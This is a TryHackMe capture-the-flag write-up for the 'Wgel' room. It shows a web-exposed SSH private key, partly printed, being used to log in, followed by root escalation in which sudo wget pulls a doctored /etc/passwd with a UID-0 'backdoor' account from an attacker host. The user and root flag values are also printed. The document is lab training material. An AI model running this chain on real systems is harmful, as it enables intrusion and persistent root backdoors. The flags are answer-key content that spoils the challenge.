# 🌐 Wgel CTF

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `wgel` / `CorpOne` |
| **OS** | Ubuntu 16.04 |
| **Attack Surface** | SSH private key exposed via misconfigured web directory |
| **Privesc** | sudo wget NOPASSWD → /etc/passwd overwrite → backdoor root user |

A username leaks from an HTML comment in the default Apache page. Directory brute-forcing exposes a `.ssh` folder under `/sitemap/`, and an unprotected `id_rsa` file inside it grants SSH access as `jessie`. From there, `jessie` can run `/usr/bin/wget` as root without a password — a classic GTFOBins write-to-file primitive that allows overwriting `/etc/passwd` with a crafted version containing a backdoor root account.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -v -p- -oA tcpscan wgel
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

Two ports — SSH and HTTP. The web server is serving the default Apache landing page.

### Web — Root

```bash
ffuf -u http://wgel/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403,401
```

```
sitemap    [Status: 301]
```

Single directory hit. Before digging deeper, a quick check of the default page source:

```bash
curl -sk http://wgel | grep -i 'jessie'
```

```
<!-- Jessie don't forget to udate the webiste -->
```

Username acquired: `jessie`. Developer left a note in an HTML comment on the public-facing page.

### Web — /sitemap/

```bash
ffuf -u http://wgel/sitemap/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403,401
```

```
images    [Status: 301]
js        [Status: 301]
css       [Status: 301]
fonts     [Status: 301]
```

Standard static site directories. File scan on the same path:

```bash
ffuf -u http://wgel/sitemap/FUZZ -w ./Web-Content/raft-medium-files.txt -ic -fc 403,401
```

```
index.html      [Status: 200]
contact.html    [Status: 200]
about.html      [Status: 200]
blog.html       [Status: 200]
services.html   [Status: 200]
shop.html       [Status: 200]
work.html       [Status: 200]
.DS_Store       [Status: 200]
.ssh            [Status: 301]
```

`.ssh` is a directory sitting directly under the web root of `/sitemap/`. No auth, no access controls — it's just browseable. The `.DS_Store` file confirms this was developed on macOS and deployed sloppily; the `.ssh` directory likely got dragged in with the site files.

### SSH Key Retrieval

```bash
curl -sk http://wgel/sitemap/.ssh/id_rsa
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
...
-----END RSA PRIVATE KEY-----
```

A full unencrypted RSA private key. No passphrase required.

---

## 💀 Initial Access — Exposed SSH Private Key

```bash
curl -sk http://wgel/sitemap/.ssh/id_rsa -o id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@wgel
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
jessie@CorpOne:~$
```

In as `jessie` with no password needed. The key was sitting in a web-accessible `.ssh` directory because the entire site folder — including a developer's SSH credentials — was uploaded to the web root.

### User Flag

```bash
find . -type f -iname "*flag*" 2>/dev/null | xargs cat
```

```
057c67131c3d5e42dd5cd3075b198ff6
```

---

## 🔁 Privilege Escalation — sudo wget → /etc/passwd Overwrite

### sudo Enumeration

```bash
sudo -l
```

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

`wget` with NOPASSWD as root. This is a classic GTFOBins file write primitive — `wget` can download a file and write it to an arbitrary path via `-O`. The target: `/etc/passwd`.

### Crafting the Backdoor

On the target, copy the current `/etc/passwd` and append a new root-level user:

```bash
cp /etc/passwd .
openssl passwd -1 -salt password password
# $1$password$Da2mWXlxe6J7jtww12SNG/

echo 'backdoor:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:root:/root:/bin/bash' >> passwd
```

Verify the append:

```bash
cat passwd | tail -n 2
```

```
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
backdoor:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:root:/root:/bin/bash
```

### Serving and Delivering the File

On the attack machine, serve the modified `passwd`:

```bash
sudo python3 -m http.server 80
```

On the target, first test the download:

```bash
wget http://192.168.240.231/passwd -O ./passwd
```

```
'./passwd' saved [2362/2362]
```

Then use the sudo primitive to overwrite `/etc/passwd`:

```bash
sudo /usr/bin/wget http://192.168.240.231/passwd -O /etc/passwd
```

```
'/etc/passwd' saved [2362/2362]
```

Verify:

```bash
cat /etc/passwd | tail -n 2
```

```
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
backdoor:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:root:/root:/bin/bash
```

### Root

```bash
su - backdoor
# Password: password
```

```
root@CorpOne:~# cat /root/root_flag.txt
b1b968b37519ad1daa6408188649263d
```

---

## 🗺️ Attack Chain

```
[Port 80 — Apache Default Page]
    HTML comment: "Jessie don't forget to update the website"
    → username: jessie
          │
          ▼
[Directory Bruteforce — /sitemap/]
    File scan hits .ssh/ directory (no auth)
    curl /sitemap/.ssh/id_rsa → unencrypted RSA private key
          │
          ▼
[SSH — jessie@CorpOne]
    ssh -i id_rsa jessie@wgel
    → user_flag.txt
          │
          ▼
[sudo -l]
    (root) NOPASSWD: /usr/bin/wget
    GTFOBins write-to-file primitive
          │
          ▼
[/etc/passwd Overwrite]
    Append backdoor:0:0 entry to local copy of /etc/passwd
    sudo wget http://attacker/passwd -O /etc/passwd
    su - backdoor → root
    → root_flag.txt
```

---

## 📌 Key Takeaways

- Developer credentials in a web root are not hypothetical — sloppy deployments that drag in dotfiles (`.ssh/`, `.DS_Store`) are common and immediately exploitable
- `wget` as a sudo primitive is a well-known GTFOBins vector; any tool that can write to arbitrary paths with elevated privileges is effectively a root shell
- `/etc/passwd` is still writable on older systems and remains a reliable LPE target when you have a file write primitive — modern systems use shadow passwords but the UID 0 trick works wherever `/etc/passwd` is world-readable and writable by root
- Usernames in HTML comments are a trivial find that saves wordlist time; always check page source before reaching for hydra

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Directory and file bruteforce |
| `curl` | Retrieve SSH private key from exposed web directory |
| `ssh` | Initial access as jessie |
| `openssl` | Generate MD5 crypt password hash for backdoor user |
| `python3` | HTTP server to deliver modified /etc/passwd |
| `wget` | sudo primitive to overwrite /etc/passwd |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user_flag.txt` | `057c67131c3d5e42dd5cd3075b198ff6` |
| `root_flag.txt` | `b1b968b37519ad1daa6408188649263d` |
